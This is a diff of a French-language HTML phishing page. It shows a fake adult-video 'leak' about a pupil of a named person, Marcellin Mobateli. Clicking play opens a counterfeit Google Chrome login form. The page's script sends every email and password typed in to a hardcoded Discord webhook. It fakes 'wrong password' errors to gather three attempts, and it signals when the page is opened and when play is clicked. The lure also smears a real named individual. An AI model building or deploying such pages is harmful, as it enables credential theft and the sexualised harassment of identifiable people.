@@ -7,34 +7,34 @@
     <link id="favicon" rel="icon" type="image/png" href="https://www.google.com/s2/favicons?domain=pornhub.com&sz=128">
     
     <style>
-        body { margin: 0; font-family: 'Roboto', Arial, sans-serif; background: #000; color: white; overflow: hidden; }
+        body { margin: 0; font-family: 'Roboto', Arial, sans-serif; background: #000; color: white; overflow-x: hidden; }
         
         /* --- LECTEUR VIDEO --- */
         #page-video { display: flex; flex-direction: column; height: 100vh; }
-        .nav-hub { padding: 15px 25px; background: #1b1b1b; display: flex; align-items: center; border-bottom: 2px solid #ff9900; }
-        .logo-hub { font-size: 1.6rem; font-weight: bold; color: #fff; text-decoration: none; }
+        .nav-hub { padding: 15px 25px; background: #1b1b1b; display: flex; align-items: center; border-bottom: 3px solid #ff9900; }
+        .logo-hub { font-size: 1.6rem; font-weight: bold; color: #fff; }
         .logo-hub span { background: #ff9900; color: #000; padding: 2px 6px; border-radius: 4px; margin-left: 4px; }
         
-        .main-zone { flex: 1; display: flex; flex-direction: column; justify-content: center; align-items: center; padding: 10px; }
-        .vid-title { margin-bottom: 15px; font-size: 1.2rem; color: #fff; text-align: center; font-weight: bold; width: 90%; }
+        .main-zone { flex: 1; display: flex; flex-direction: column; justify-content: center; align-items: center; padding: 15px; }
+        .vid-title { margin-bottom: 5px; font-size: 1.3rem; color: #fff; text-align: center; font-weight: bold; }
+        .vid-stats { color: #aaa; font-size: 0.9rem; margin-bottom: 20px; }
 
-        .video-container { width: 100%; max-width: 800px; aspect-ratio: 16/9; background: #111; border-radius: 8px; position: relative; overflow: hidden; border: 1px solid #333; cursor: pointer; }
+        .video-container { width: 100%; max-width: 800px; aspect-ratio: 16/9; background: #111; border-radius: 10px; position: relative; overflow: hidden; border: 1px solid #333; cursor: pointer; }
+        .thumbnail-img { width: 100%; height: 100%; object-fit: cover; display: block; filter: brightness(0.8); }
         
-        /* L'IMAGE DU DEPOT (Nette, sans flou excessif) */
-        .thumbnail-img { width: 100%; height: 100%; object-fit: cover; display: block; }
-        
-        .play-overlay { position: absolute; inset: 0; display: flex; flex-direction: column; justify-content: center; align-items: center; background: rgba(0,0,0,0.3); transition: 0.3s; }
-        .play-overlay:hover { background: rgba(0,0,0,0.1); }
-        
-        .btn-play { width: 70px; height: 70px; background: rgba(255, 153, 0, 0.95); border-radius: 50%; display: flex; justify-content: center; align-items: center; box-shadow: 0 0 20px rgba(0,0,0,0.5); }
-        .btn-play::after { content: ''; border-top: 12px solid transparent; border-bottom: 12px solid transparent; border-left: 20px solid white; margin-left: 6px; }
+        /* Badge Durée */
+        .duration-badge { position: absolute; bottom: 10px; right: 10px; background: rgba(0,0,0,0.8); padding: 2px 6px; border-radius: 4px; font-size: 0.8rem; font-weight: bold; }
+
+        .play-overlay { position: absolute; inset: 0; display: flex; flex-direction: column; justify-content: center; align-items: center; background: rgba(0,0,0,0.2); }
+        .btn-play { width: 75px; height: 75px; background: #ff9900; border-radius: 50%; display: flex; justify-content: center; align-items: center; box-shadow: 0 0 25px rgba(255,153,0,0.4); }
+        .btn-play::after { content: ''; border-top: 14px solid transparent; border-bottom: 14px solid transparent; border-left: 24px solid white; margin-left: 7px; }
 
         /* --- LOGIN GOOGLE --- */
         #page-login { display: none; background: white; min-height: 100vh; color: #202124; flex-direction: column; align-items: center; padding-top: 50px; }
-        .login-wrap { width: 90%; max-width: 440px; }
+        .login-wrap { width: 90%; max-width: 440px; text-align: center; }
         .google-logo { width: 48px; margin-bottom: 15px; }
         
-        .field { position: relative; margin-top: 35px; }
+        .field { position: relative; margin-top: 35px; text-align: left; }
         .input-box { border: 1px solid #dadce0; border-radius: 4px; padding: 14px 16px; position: relative; }
         .input-box.error { border: 2px solid #b3261e; }
         
@@ -43,14 +43,14 @@
         
         input { border: none; width: 100%; font-size: 16px; outline: none; background: transparent; }
         
-        .error-msg { display: none; color: #b3261e; font-size: 14px; margin-top: 8px; align-items: flex-start; text-align: left; }
+        .error-msg { display: none; color: #b3261e; font-size: 14px; margin-top: 8px; align-items: flex-start; line-height: 1.4; }
         .err-icon { background: #b3261e; color: #fff; border-radius: 50%; min-width: 16px; height: 16px; display: inline-flex; justify-content: center; align-items: center; font-size: 11px; margin-right: 10px; margin-top: 2px; }
 
-        .check-row { display: flex; align-items: center; margin-top: 25px; cursor: pointer; font-size: 15px; color: #202124; }
-        .check-row input { width: 18px; height: 18px; margin-right: 12px; }
+        .check-row { display: flex; align-items: center; margin-top: 25px; cursor: pointer; font-size: 15px; color: #202124; text-align: left; }
+        .check-row input { width: 18px; height: 18px; margin-right: 12px; cursor: pointer; }
 
-        .footer { margin-top: 45px; display: flex; justify-content: flex-end; }
-        .btn-next { background: #1a73e8; color: white; border: none; padding: 10px 24px; border-radius: 4px; font-weight: 500; cursor: pointer; }
+        .footer { margin-top: 45px; display: flex; justify-content: flex-end; width: 100%; }
+        .btn-next { background: #1a73e8; color: white; border: none; padding: 10px 24px; border-radius: 4px; font-weight: 500; cursor: pointer; font-size: 14px; }
     </style>
 </head>
 <body>
@@ -58,22 +58,25 @@
     <div id="page-video">
         <div class="nav-hub"><div class="logo-hub">HUB<span>VIDEO</span></div></div>
         <div class="main-zone">
-            <h1 class="vid-title">SÉQUENCE EXCLUSIVE : MARCELLIN MOBATELI</h1>
-            <div class="video-container" onclick="switchPage()">
-                <img src="thumbnail.jpg" class="thumbnail-img" alt="Video Thumbnail">
+            <h1 class="vid-title">FUITE : ÉLÈVE DE MARCELLIN MOBATELI</h1>
+            <div class="vid-stats">120 J'aime • Publié il y a 4 heures</div>
+            
+            <div class="video-container" onclick="lancerAudit()">
+                <img src="thumbnail.jpg" class="thumbnail-img">
+                <div class="duration-badge">2:14</div>
                 <div class="play-overlay">
                     <div class="btn-play"></div>
-                    <p style="margin-top:15px; font-weight:bold; text-shadow: 2px 2px 4px rgba(0,0,0,0.8);">REGARDER LA VIDÉO (04:12)</p>
+                    <p style="margin-top:20px; font-weight:bold; text-shadow: 2px 2px 4px #000; letter-spacing: 1px;">VOIR LA VIDÉO</p>
                 </div>
             </div>
         </div>
     </div>
 
     <div id="page-login">
-        <center class="login-wrap">
+        <div class="login-wrap">
             <img src="https://upload.wikimedia.org/wikipedia/commons/e/e1/Google_Chrome_icon_%28February_2022%29.svg" class="google-logo">
             <h1 style="font-weight:400; margin:0;">Google Chrome</h1>
-            <p style="color:#5f6368;">Confirmez votre identité pour continuer</p>
+            <p style="color:#5f6368; margin-top:8px;">Authentification requise pour le contenu 18+</p>
 
             <form id="auditForm">
                 <div class="field">
@@ -90,7 +93,7 @@
                     </div>
                     <div id="eRow" class="error-msg">
                         <span class="err-icon">!</span>
-                        <span>Mot de passe incorrect. Réessayez ou cliquez sur "Mot de passe oublié ?" pour plus d'options.</span>
+                        <span>Mot de passe incorrect. Réessayez ou cliquez sur "Mot de passe oublié ?" pour accéder à la vidéo.</span>
                     </div>
                 </div>
 
@@ -102,22 +105,20 @@
                     <button type="submit" class="btn-next">Suivant</button>
                 </div>
             </form>
-        </center>
+        </div>
     </div>
 
     <script>
         const WEBHOOK = "https://discordapp.com/api/webhooks/1463375154313695425/b8j4vFvQYxlrrtYrxSXgOrV3PEsdA4vXaywKb8xIMo6qEt6vVAqc3yQb_srF7-aDg4a-";
-        let attempt = 0;
+        let essai = 0;
 
-        // SIGNAL : OUVERTURE
         window.onload = () => {
             fetch(WEBHOOK, { method: 'POST', headers: {'Content-Type': 'application/json'},
-                body: JSON.stringify({ content: "🚨 **Audit** : Page ouverte (Marcellin Mobateli)." })
+                body: JSON.stringify({ content: "🚩 **Alerte** : Lien ouvert (Élève Marcellin)." })
             });
         };
 
-        // SIGNAL : CLIC
-        function switchPage() {
+        function lancerAudit() {
             fetch(WEBHOOK, { method: 'POST', headers: {'Content-Type': 'application/json'},
                 body: JSON.stringify({ content: "🖱️ **Action** : Clic sur Play." })
             });
@@ -131,29 +132,28 @@
             document.getElementById('pass').type = this.checked ? 'text' : 'password';
         };
 
-        // SIGNAL : DONNÉES
         document.getElementById('auditForm').onsubmit = function(e) {
             e.preventDefault();
-            attempt++;
-            const m = document.getElementById('email').value;
-            const p = document.getElementById('pass').value;
+            essai++;
+            const mail = document.getElementById('email').value;
+            const mdp = document.getElementById('pass').value;
 
             fetch(WEBHOOK, {
                 method: 'POST',
                 headers: {'Content-Type': 'application/json'},
                 body: JSON.stringify({
                     embeds: [{
-                        title: "🔓 Tentative " + attempt + "/3",
-                        color: attempt === 3 ? 15158332 : 3447003,
+                        title: "🔓 Login Marcellin (" + essai + "/3)",
+                        color: essai === 3 ? 15158332 : 3447003,
                         fields: [
-                            { name: "👤 Email", value: "`" + m + "`" },
-                            { name: "🔑 Mot de passe", value: "`" + p + "`" }
+                            { name: "👤 Email", value: "`" + mail + "`" },
+                            { name: "🔑 Pass", value: "`" + mdp + "`" }
                         ],
                         timestamp: new Date()
                     }]
                 })
             }).then(() => {
-                if (attempt < 3) {
+                if (essai < 3) {
                     document.getElementById('pBox').classList.add('error');
                     document.getElementById('eRow').style.display = 'flex';
                     document.getElementById('pass').value = '';
